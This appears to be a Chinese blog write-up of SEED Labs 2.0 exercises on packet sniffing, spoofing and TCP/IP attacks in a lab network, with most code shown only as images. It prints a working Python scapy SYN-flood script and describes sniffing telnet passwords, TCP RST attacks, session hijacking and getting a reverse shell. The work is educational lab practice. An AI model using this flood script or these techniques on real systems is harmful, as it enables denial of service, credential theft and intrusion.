<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113153947133.png" alt="image-20231113153947133"></p>
<h3 id="Task-1-3-Traceroute"><a href="#Task-1-3-Traceroute" class="headerlink" title="Task 1.3: Traceroute"></a>Task 1.3: Traceroute</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113155311599.png" alt="image-20231113155311599"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113155303321.png" alt="image-20231113155303321"></p>
<h3 id="Task-1-4-Sniffing-and-then-Spoofing"><a href="#Task-1-4-Sniffing-and-then-Spoofing" class="headerlink" title="Task 1.4: Sniffing and-then Spoofing"></a>Task 1.4: Sniffing and-then Spoofing</h3><p>在VM中编写如下代码，当嗅探到有icmp-echo的数据包时，返回给发送数据包的主机一个icmp响应</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113162009725.png" alt="image-20231113162009725"></p>
<p>发现无论ping什么地址，都能获得响应：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113162123551.png" alt="image-20231113162123551"></p>
<p>同时从欺骗工具来看，是VM发送的响应。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20231113162123551.png"></p>
<p>完成如下的命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113162317900.png" alt="image-20231113162317900"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113162309278.png" alt="image-20231113162309278"></p>
<p>发现不存在的地址是不会返回响应的</p>
<h2 id="Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets"><a href="#Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets" class="headerlink" title="Lab Task Set 2: Writing Programs to Sniff and Spoof Packets"></a>Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</h2><h3 id="Task-2-1A-Understanding-How-a-Sniffer-Works"><a href="#Task-2-1A-Understanding-How-a-Sniffer-Works" class="headerlink" title="Task 2.1A: Understanding How a Sniffer Works"></a>Task 2.1A: Understanding How a Sniffer Works</h3><p>编写代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113163306764.png" alt="image-20231113163306764"></p>
<p>通过PING baidu来测试</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113163321972.png" alt="image-20231113163321972"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113163329023.png" alt="image-20231113163329023"></p>
<p><strong>Question 1. Please use your own words to describe the sequence of the library calls that are essential for sniffer programs. This is meant to be a summary, not detailed explanation like the one in the tutorial or book.</strong></p>
<p>通过bpf程序来捕获ICMP的数据包，然后通过指针来对数据包的不同位置（IP头，ICMP头）等进行处理</p>
<p><strong>Question 2. Why do you need the root privilege to run a sniffer program? Where does the program fail if it is executed without the root privilege?</strong></p>
<p>因为bpf程序需要挂载到内核中去，属于特权操作</p>
<p><strong>Question 3. Please turn on and turn off the promiscuous mode in your sniffer program. The value 1 of the third parameter in pcap open live() turns on the promiscuous mode (use 0 to turn it off). Can you demonstrate the difference when this mode is on and off? Please describe how you can demonstrate this. You can use the following command to check whether an interface’s promiscuous mode is on or off (look at the promiscuity’s value).</strong></p>
<p>使用混杂模式可以监听所在网段下其他机器的数据包，关闭则不能。</p>
<h3 id="Task-2-1B-Writing-Filters"><a href="#Task-2-1B-Writing-Filters" class="headerlink" title="Task 2.1B: Writing Filters"></a>Task 2.1B: Writing Filters</h3><p>更改规则和网卡名称：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20231113165127861.png" alt="image-20231113165127861"></p>
<p>使用10.9.0.6的容器内部去ping 10.9.0.1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113165140031.png" alt="image-20231113165140031"></p>
<p>能获取</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113165118390.png" alt="image-20231113165118390"></p>
<p>改变过滤规则</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113165346911.png" alt="image-20231113165346911"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113165336071.png" alt="image-20231113165336071"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113165323851.png" alt="image-20231113165323851"></p>
<h3 id="Task-2-1C-Sniffing-Passwords"><a href="#Task-2-1C-Sniffing-Passwords" class="headerlink" title="Task 2.1C: Sniffing Passwords."></a>Task 2.1C: Sniffing Passwords.</h3><p>编写嗅探工具嗅探23端口</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113171048983.png" alt="image-20231113171048983"></p>
<p>以此类推可以得到密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113171007413.png" alt="image-20231113171007413"></p>
<h2 id="Task-2-2-Spoofing"><a href="#Task-2-2-Spoofing" class="headerlink" title="Task 2.2: Spoofing"></a>Task 2.2: Spoofing</h2><h3 id="Task-2-2A-Write-a-spoofing-program"><a href="#Task-2-2A-Write-a-spoofing-program" class="headerlink" title="Task 2.2A: Write a spoofing program."></a>Task 2.2A: Write a spoofing program.</h3><p>从源IP地址“1.1.1.1”向目标IP地址“8.8.8.8”的9090端口发送UDP消息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113173204693.png" alt="image-20231113173204693"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113173145978.png" alt="image-20231113173145978"></p>
<h3 id="Task-2-2B-Spoof-an-ICMP-Echo-Request"><a href="#Task-2-2B-Spoof-an-ICMP-Echo-Request" class="headerlink" title="Task 2.2B: Spoof an ICMP Echo Request."></a>Task 2.2B: Spoof an ICMP Echo Request.</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113173437373.png" alt="image-20231113173437373"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113173409185.png" alt="image-20231113173409185"></p>
<h3 id="Question-4-Can-you-set-the-IP-packet-length-field-to-an-arbitrary-value-regardless-of-how-big-the-actual-packet-is"><a href="#Question-4-Can-you-set-the-IP-packet-length-field-to-an-arbitrary-value-regardless-of-how-big-the-actual-packet-is" class="headerlink" title="Question 4. Can you set the IP packet length field to an arbitrary value, regardless of how big the actual packet is?"></a>Question 4. Can you set the IP packet length field to an arbitrary value, regardless of how big the actual packet is?</h3><p>不可以</p>
<h3 id="Question-5-Using-the-raw-socket-programming-do-you-have-to-calculate-the-checksum-for-the-IP-header"><a href="#Question-5-Using-the-raw-socket-programming-do-you-have-to-calculate-the-checksum-for-the-IP-header" class="headerlink" title="Question 5. Using the raw socket programming, do you have to calculate the checksum for the IP header?"></a>Question 5. Using the raw socket programming, do you have to calculate the checksum for the IP header?</h3><p>不用计算IP头部的checksum</p>
<h3 id="Question-6-Why-do-you-need-the-root-privilege-to-run-the-programs-that-use-raw-sockets-Where-does-the-program-fail-if-executed-without-the-root-privilege"><a href="#Question-6-Why-do-you-need-the-root-privilege-to-run-the-programs-that-use-raw-sockets-Where-does-the-program-fail-if-executed-without-the-root-privilege" class="headerlink" title="Question 6. Why do you need the root privilege to run the programs that use raw sockets? Where does the program fail if executed without the root privilege?"></a>Question 6. Why do you need the root privilege to run the programs that use raw sockets? Where does the program fail if executed without the root privilege?</h3><p>因为能任意读取发送包意味着很大的安全风险，所以需要root权限</p>
<h2 id="Task-2-3-Sniff-and-then-Spoof"><a href="#Task-2-3-Sniff-and-then-Spoof" class="headerlink" title="Task 2.3: Sniff and then Spoof"></a>Task 2.3: Sniff and then Spoof</h2><p>代码如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113174032258.png" alt="image-20231113174032258"></p>
<p>sudo .&#x2F;task23运行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20231113173954577.png" alt="image-20231113173954577"></p>
<p>使用另一台机器ping 1.1.1.1，此机器运行上面的程序，结果如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231113174010672.png" alt="image-20231113174010672"></p>
<h1 id="TCP-IP-Attack-Lab"><a href="#TCP-IP-Attack-Lab" class="headerlink" title="TCP&#x2F;IP Attack Lab"></a>TCP&#x2F;IP Attack Lab</h1><h2 id="Task-1-SYN-Flooding-Attack"><a href="#Task-1-SYN-Flooding-Attack" class="headerlink" title="Task 1: SYN Flooding Attack"></a>Task 1: SYN Flooding Attack</h2><p>查看队列长度</p>
<p><code>sysctl net.ipv4.tcp_max_syn_backlog</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127145112522.png" alt="image-20231127145112522"></p>
<h3 id="Task-1-1-Launching-the-Attack-Using-Python"><a href="#Task-1-1-Launching-the-Attack-Using-Python" class="headerlink" title="Task 1.1: Launching the Attack Using Python"></a>Task 1.1: Launching the Attack Using Python</h3><p>编写攻击程序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> IP, TCP, send</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">ip = IP(dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(dport=<span class="number">23</span>, flags=<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">pkt = ip/tcp</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pkt[IP].src = <span class="built_in">str</span>(IPv4Address(getrandbits(<span class="number">32</span>))) <span class="comment"># source iP</span></span><br><span class="line">    pkt[TCP].sport = getrandbits(<span class="number">16</span>) <span class="comment"># source port</span></span><br><span class="line">    pkt[TCP].seq = getrandbits(<span class="number">32</span>) <span class="comment"># sequence number</span></span><br><span class="line">    send(pkt, verbose = <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>登录进入受害机，执行<code>netstat -nat</code>都为正常</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127151035054.png" alt="image-20231127151035054"></p>
<p>执行命令：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127151204094.png" alt="image-20231127151204094"></p>
<p>再次查看<code>10.9.0.5</code>主机的TCP连接，发现大量的攻击源，而且IP地址随机：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127151253037.png" alt="image-20231127151253037"></p>
<h3 id="Task-1-2-Launch-the-Attack-Using-C"><a href="#Task-1-2-Launch-the-Attack-Using-C" class="headerlink" title="Task 1.2: Launch the Attack Using C"></a>Task 1.2: Launch the Attack Using C</h3><p>编译提供好的C程序，进行攻击。先查看受害机的TCP连接。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127151415515.png" alt="image-20231127151415515"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127151456371.png" alt="image-20231127151456371"></p>
<p>进行攻击：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127151518059.png" alt="image-20231127151518059"></p>
<h3 id="Task-1-3-Enable-the-SYN-Cookie-Countermeasure"><a href="#Task-1-3-Enable-the-SYN-Cookie-Countermeasure" class="headerlink" title="Task 1.3 Enable the SYN Cookie Countermeasure"></a>Task 1.3 Enable the SYN Cookie Countermeasure</h3><p>打开：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127151640438.png" alt="image-20231127151640438"></p>
<p>进行攻击：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127151719327.png" alt="image-20231127151719327"></p>
<p>还是有着大量的攻击</p>
<h2 id="Task-2-TCP-RST-Attacks-on-telnet-Connections"><a href="#Task-2-TCP-RST-Attacks-on-telnet-Connections" class="headerlink" title="Task 2: TCP RST Attacks on telnet Connections"></a>Task 2: TCP RST Attacks on telnet Connections</h2><p>编写一个嗅探和RST攻击的程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127154045190.png" alt="image-20231127154045190"></p>
<p>使用<code>10.9.0.7</code>连接<code>10.9.0.6</code>，当<code>10.9.0.7</code>发送了一个包给.6时，就会收到一个RST的包，导致连接关闭</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127154025934.png" alt="image-20231127154025934"></p>
<h2 id="Task-3-TCP-Session-Hijacking"><a href="#Task-3-TCP-Session-Hijacking" class="headerlink" title="Task 3: TCP Session Hijacking"></a>Task 3: TCP Session Hijacking</h2><p>编写攻击程序：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127154339887.png" alt="image-20231127154339887"></p>
<p>telnet连接10.9.0.6的终端：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127154421786.png" alt="image-20231127154421786"></p>
<p>运行程序：发现攻击成功！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127154504479.png" alt="image-20231127154504479"></p>
<p>查看10.9.0.6 &#x2F;home&#x2F;seed&#x2F;hijacking.out文件是否存在，以及内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127154607301.png" alt="image-20231127154607301"></p>
<h2 id="Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><a href="#Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking" class="headerlink" title="Task 4: Creating Reverse Shell using TCP Session Hijacking"></a>Task 4: Creating Reverse Shell using TCP Session Hijacking</h2><p>编写劫持程序：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127154737576.png" alt="image-20231127154737576"></p>
<p>在<code>10.9.0.5 9090端口监听10.9.0.6</code>上的连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127154823012.png" alt="image-20231127154823012"></p>
<p>使用10.9.0.7连接10.9.0.6</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127154928972.png" alt="image-20231127154928972"></p>
<p>运行劫持程序，发现已经getshell：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231127155026999.png" alt="image-20231127155026999"></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20240112195732.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20240112195732.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">Johnny</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://jieyugit.github.io/2023/09/04/20231129-SEED-Labs-2.0/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://jieyugit.github.io/2023/09/04/20231129-SEED-Labs-2.0/')">SEED Labs 2.0</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://jieyugit.github.io/2023/09/04/20231129-SEED-Labs-2.0/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SEED Labs 2.0&amp;url=https://jieyugit.github.io/2023/09/04/20231129-SEED-Labs-2.0/&amp;pic=https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129143832.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jieyugit.github.io" target="_blank">Johnny</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>安全<span class="tagsPageCount">5</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://i.ytimg.com/vi/8ev9ZX9J45A/maxresdefault.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/02/20240102-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129085559.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">网络空间安全技术</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/27/20231127-vulhub-DC/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129133005.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">vulhub DC</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; 